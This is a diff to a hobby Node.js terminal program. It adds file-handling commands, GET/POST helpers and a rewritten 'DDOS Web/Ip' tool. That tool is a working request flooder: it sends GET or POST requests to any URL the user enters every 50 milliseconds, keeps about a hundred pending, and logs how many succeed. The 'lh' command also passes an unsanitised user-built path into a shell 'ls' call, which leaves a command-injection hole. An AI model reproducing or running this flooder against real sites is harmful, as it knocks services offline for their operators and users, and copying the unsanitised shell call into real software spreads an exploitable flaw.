@@ -2,8 +2,11 @@
 const fs = require("fs");
 const prompt = require("prompt-sync")();
 const os = require("os");
+// const fetch = require("node-fetch");
 const { exec } = require("child_process");
 const { exit } = require("process");
+const { json } = require("stream/consumers");
+const { createSecretKey } = require("crypto");
 
 //prepeare
 console.clear()
@@ -14,6 +17,8 @@ console.log("Starting...")
 let db = {}
 let history = []
 let lock = true
+var dirs = os.homedir();
+var renDirs = '';
 
 //main js
 const main = ()=>{
@@ -73,7 +78,7 @@ const main = ()=>{
 
 //command line
 const cmd = ()=>{
-  var command = prompt(`${db.Name}@${db.Machine} => `);
+  var command = prompt(`${db.Name}@${db.Machine} | ${dirs} => `);
   history.push(command);
   search(command);
 }
@@ -93,6 +98,13 @@ const search = (item)=>{
       systeminfo //show system information
       version //console version
       setname //set console name or machine name
+      read <path> //read file
+      create dir <path> //create directory
+      create file <name> //create file
+      lh //List Here
+      edir //enter dirs
+      hdir //back to home dirs
+      pdir //enter process dir
       exit //exit console
       `)
     cmd();
@@ -199,6 +211,75 @@ const search = (item)=>{
       console.debug("aborted")
       cmd()
     }
+  }else if(item.substring(0, 4) == "read"){
+    fs.readFile(`${dirs}/${item.substring(5)}`, "utf-8", (err, data)=>{
+      if(err){
+        console.error(`Error : ${err}`);
+        cmd();
+      }else {
+        console.log(data);
+        cmd();
+      }
+    })
+  }else if (item.substring(0, 6) == "create"){
+    creates(item.substring(7));
+  }else if (item == "lh"){
+    exec(`ls ${dirs}`, (error, stdout, stderr) => {
+      if (error) {
+          console.log(`error: ${error.message}`);
+          // return;
+      }
+      if (stderr) {
+          console.log(`stderr: ${stderr}`);
+          // return;
+      }
+      console.log(stdout);
+      cmd();
+  });
+  }else if (item.substring(0, 2) == "rm"){
+    if (item.substring(0, 8) == "rm --dir"){
+      if(`${dirs}/${item.substring(9)}` == process.cwd()){
+        console.log("Protected Dir");
+        cmd();
+      }else{
+        fs.rmdir(`${dirs}/${item.substring(9)}`, err=>{
+          if (err){
+            console.error(`Error : ${err}`);
+            cmd();
+          }else {
+            console.log(`Succesfully Remove ${item.substring(9)} Dirs`);
+            cmd();
+          }
+        })
+      }
+    }else {
+      if(`${dirs}/${item.substring(3)}` == `${process.cwd()}/main.js`){
+        console.log("Protected File");
+        cmd();
+      }
+      fs.rm(`${dirs}/${item.substring(3)}`, err=>{
+        if (err){
+          console.error(`Error : ${err}`);
+          cmd();
+        }else {
+          console.log(`Succesfully Remove ${item.substring(3)} Files`);
+          cmd();
+        }
+      })
+    }
+  }
+  else if(item.substring(0, 4) == "edir"){
+    renDirs = item.substring(5);
+    dirs += `/${renDirs}`
+    cmd();
+  }else if(item == "pdir"){
+    renDirs = ""
+    dirs = process.cwd();
+    cmd();
+  }else if(item == "hdir"){
+    renDirs = ""
+    dirs = os.homedir();
+    cmd();
   }
   else{
     console.error(`Command ${item} not Found`);
@@ -213,47 +294,96 @@ const tools = (action)=>{
     const fpms = 100;
     const menu = ()=>{
       console.clear();
-      console.log("1. DDOS Web");
-      console.log("2. DDOS IP");
+      console.log("1. DDOS Web/Ip");
       console.log("0. Exit");
       var opt = prompt("chose : ");
       if (opt == 0){
         cmd();
       }else if (opt == 1){
         var ip = prompt("IP : ");
+        var methd = prompt("Method [GET/POST] : ");
         let cout = prompt("Req : ");
-        let limit = 0, succes = 0, failed = 0, loglimit = 0;
+        let total = cout;
+        let limit = 0, succes = 0, failed = 0, loglimit = 0, totals = 0;
         var log = ``;
-        let requ = setInterval(()=>{
-          if (loglimit > 9){
-            log = ``
-            loglimit=0;
-          }else {
-            cout--;
-            loglimit++;
-            log += `
-          Succes`
-          }
-        }, 50)
-        let ddos = setInterval(()=>{
-          if (cout < 0){
-            clearInterval(ddos);
-            clearInterval(requ);
-            console.log("DONE");
-            cmd()
-          }else {
-            console.clear();
-            console.log(`
-            Send To : ${ip}
-            Request Remeaining : ${cout}
-            Limit : ${limit}
-            Succes : ${succes}
-            Failed : ${failed}
-    -------------------LOG--------------------
-      ${log}
-            `)
-          }
-        }, fpms);
+        let lock = false;
+        const display = ()=>{
+          console.clear();
+        console.log(`
+  Send To : ${ip}
+  Request Remeaining : ${cout} | ${(totals / total * 100).toFixed(2)}%
+  Pending : ${limit}
+  Succes : ${succes}
+  Failed : ${failed}
+-------------------LOG--------------------
+  ${log}
+        `)
+        }
+        if (methd == `GET`||methd == `POST`&&ip.includes("http://")||ip.includes("https://")){
+          let requ = setInterval(()=>{
+            if (cout < 1){}else{
+              if (limit > 99||lock){
+                lock = true;
+                if (limit < 1){
+                  lock = false;
+                }else {
+                  // limit--;
+                }
+              }else {
+                if (loglimit > 14){
+                  log = ``
+                  loglimit=0;
+                }else {
+                  cout--;
+                  totals++;
+                  limit++;
+                  fetch(ip, { method: methd }).then((data)=>{
+                    if (data.status == 200){
+                      succes++;
+                      limit--;
+                      loglimit++;
+                      log += `
+  Succes ${methd} on ${ip} at req ${cout} status ${data.status} | ${data.statusText}`
+                    }else {
+                      failed++;
+                      limit--;
+                      loglimit++;
+                      log += `
+  Failed ${methd} on ${ip} at req ${cout} status ${data.status} | ${data.statusText}`
+                    }
+                  }).catch(()=>{
+                    failed++;
+                    limit--;
+                    loglimit++;
+                    log+=`
+  Fetch Error, Check IP or Method`
+                  })
+                //   log += `
+                // Succes`
+                }
+              }
+            }
+          }, 50)
+          //display
+          let ddos = setInterval(()=>{
+            if (cout < 1){
+              clearInterval(requ);
+              if(limit < 1){
+                clearInterval(ddos);
+                display();
+                console.log("DONE");
+                cmd()
+              }else { display() }
+            }else {
+              display()
+            }
+          }, fpms);
+        }else{
+          console.log("Invalid Method Or IP");
+          setTimeout(() => {
+            menu()
+          }, 1000);
+        } 
       }
       else {
         menu();
@@ -263,12 +393,86 @@ const tools = (action)=>{
   }else if (action == "help"){
     console.log(`
       ddos //ddos tools
+      get //GET URL Information
+      post //POST data or json
+      post <json path> //POST file.json
     `)
     cmd();
+  }else if (action == "get"){
+    var IP = prompt("IP : ");
+    console.debug("Getting Information")
+    fetch(IP, {method: "GET"}).then((res)=>{
+      console.log(`
+      -----GET IP-----
+      URL ${res.url}
+      Type : ${res.type}
+      Redirected : ${res.redirected}
+      Status : ${res.status}
+      Status Text : ${res.statusText}
+      Ok : ${res.ok}
+      `)
+      cmd();
+    }).catch(err =>{ console.error(`Error : ${err}`); cmd(); })
+  }else if (action.substring(0, 4) == "post"){
+    if (action.substring(5) == ""){
+      var IP = prompt("IP : ");
+      let reqData = prompt(`Data Body {"example": "example"}: `);
+      console.log("Requesting...")
+      fetch(IP, {
+        method: "POST",
+        mode: "cors",
+        headers: { 'Content-Type': "application/json" },
+        body: JSON.stringify(reqData)
+      }).then(res => { console.log(res); cmd(); }).catch(err => { console.log(err); cmd(); })
+    }else {
+      var IP = prompt("IP : ");
+      fs.readFile(action.substring(5), "utf-8", (err, data)=>{
+        if (err){
+          console.error(`Error : ${err}`)
+          cmd()
+        }else {
+          fetch(IP, {
+            method: "POST",
+            mode: "cors",
+            headers: { 'Content-Type': "application/json" },
+            body: data
+          }).then(res => { console.log(res); cmd(); }).catch(err => { console.log(err); cmd(); })
+        }
+      })
+    }
   }
   else {
     console.error(`Try run "tools help"`);
     cmd();
+  }
+}
+
+//create
+const creates = (items) => {
+  if (items.substring(0, 3) == "dir"){
+    fs.mkdir(`${dirs}/${items.substring(4)}`, err => {
+      if (err){
+        console.error(`Error : ${err}`);
+        cmd();
+      }else {
+        console.log(`Succes Create ${items.substring(4)} directory`);
+        cmd()
+      }
+    })
+  }else if (items.substring(0, 4) == "file"){
+    fs.writeFile(`${dirs}/${items.substring(5)}`, "", err =>{
+      if (err){
+        console.error(`Error : ${err}`);
+        cmd();
+      }else {
+        console.log(`Succes Create ${items.substring(4)} Files`);
+        cmd()
+      }
+    })
+  }
+  else{
+    console.error(`${items} Not Found`);
+    cmd()
   }
 }
 
